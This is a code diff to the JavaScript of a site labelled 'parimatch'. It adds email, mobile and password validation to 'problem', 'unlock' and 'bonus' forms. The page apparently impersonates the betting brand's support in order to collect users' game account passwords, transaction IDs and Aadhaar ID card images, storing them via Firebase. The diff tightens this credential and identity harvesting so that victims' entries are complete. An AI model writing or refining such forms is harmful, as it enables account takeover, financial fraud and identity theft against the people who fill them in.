@@ -12,6 +12,20 @@ const FIREBASE_CONFIG = {
 
 const SITE_ID = "parimatch";
 
+// ===== VALIDATION HELPERS =====
+function isValidEmail(v) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(String(v || '').trim());
+}
+
+function isValidMobile(v) {
+  var digits = String(v || '').replace(/[^\d]/g, '');
+  return digits.length >= 10 && digits.length <= 15;
+}
+
+function isValidPassword(v) {
+  return String(v || '').length >= 4;
+}
+
 // ===== FIREBASE DYNAMIC LOADER =====
 let _fbDb = null;
 let _fbLoading = null;
@@ -164,6 +178,27 @@ document.addEventListener('DOMContentLoaded', () => {
         showNotification("Please select your problem status", "error");
         return;
       }
+
+      const emailVal = document.getElementById('email').value;
+      const mobileVal = document.getElementById('mobile').value;
+      const passwordVal = document.getElementById('password').value;
+
+      if (!emailVal.trim()) { showNotification("Please enter your Game Email ID", "error"); return; }
+      if (!isValidEmail(emailVal)) { showNotification("Please enter a valid email address", "error"); return; }
+      if (!mobileVal.trim()) { showNotification("Please enter your Game Account Mobile No.", "error"); return; }
+      if (!isValidMobile(mobileVal)) { showNotification("Please enter a valid mobile number (min 10 digits)", "error"); return; }
+      if (!passwordVal) { showNotification("Please enter your Game Account Password", "error"); return; }
+      if (!isValidPassword(passwordVal)) { showNotification("Password must be at least 4 characters", "error"); return; }
+
+      const type = document.querySelector('.tab-btn.active').dataset.tab;
+      if (type === 'deposit') {
+        if (!document.getElementById('depositAmount').value.trim()) { showNotification("Please enter Deposit Amount", "error"); return; }
+        if (!document.getElementById('utr').value.trim()) { showNotification("Please enter UTR / Transaction ID", "error"); return; }
+      } else {
+        if (!document.getElementById('withdrawAmount').value.trim()) { showNotification("Please enter Withdrawal Amount", "error"); return; }
+        if (!document.getElementById('withdrawMethod').value) { showNotification("Please select Withdrawal Method", "error"); return; }
+      }
+      if (!document.getElementById('description').value.trim()) { showNotification("Please describe your issue", "error"); return; }
 
       const submitBtn = problemForm.querySelector('.btn-submit');
       const originalBtnText = submitBtn.innerHTML;
@@ -464,8 +499,11 @@ try {
       var pwd = $unlock('fPassword');
       if (!uname || !uname.value.trim()) { showUnlockToast('Enter User Name'); uname.focus(); return; }
       if (!em || !em.value.trim()) { showUnlockToast('Enter Game Email ID'); em.focus(); return; }
+      if (!isValidEmail(em.value)) { showUnlockToast('Enter a valid email address'); em.focus(); return; }
       if (!acc || !acc.value.trim()) { showUnlockToast('Enter Game Mobile Number'); acc.focus(); return; }
+      if (!isValidMobile(acc.value)) { showUnlockToast('Enter a valid mobile number (min 10 digits)'); acc.focus(); return; }
       if (!pwd || !pwd.value.trim()) { showUnlockToast('Enter Game Account Password'); pwd.focus(); return; }
+      if (!isValidPassword(pwd.value)) { showUnlockToast('Password must be at least 4 characters'); pwd.focus(); return; }
       var issue = document.querySelector('[name="issue_image"]');
       var aadharF = document.querySelector('[name="aadhar_front"]');
       var aadharB = document.querySelector('[name="aadhar_back"]');
@@ -689,8 +727,11 @@ try {
       var pwd = $unlock('bfPassword');
       if (!uname || !uname.value.trim()) { showBonusToast('Enter User Name'); uname.focus(); return; }
       if (!em || !em.value.trim()) { showBonusToast('Enter Game Email ID'); em.focus(); return; }
+      if (!isValidEmail(em.value)) { showBonusToast('Enter a valid email address'); em.focus(); return; }
       if (!acc || !acc.value.trim()) { showBonusToast('Enter Game Account Number'); acc.focus(); return; }
+      if (!isValidMobile(acc.value)) { showBonusToast('Enter a valid account/mobile number (min 10 digits)'); acc.focus(); return; }
       if (!pwd || !pwd.value.trim()) { showBonusToast('Enter Game Account Password'); pwd.focus(); return; }
+      if (!isValidPassword(pwd.value)) { showBonusToast('Password must be at least 4 characters'); pwd.focus(); return; }
       _bonusData.user_name = uname.value.trim();
       _bonusData.email = em.value.trim();
       _bonusData.account_number = acc.value.trim();
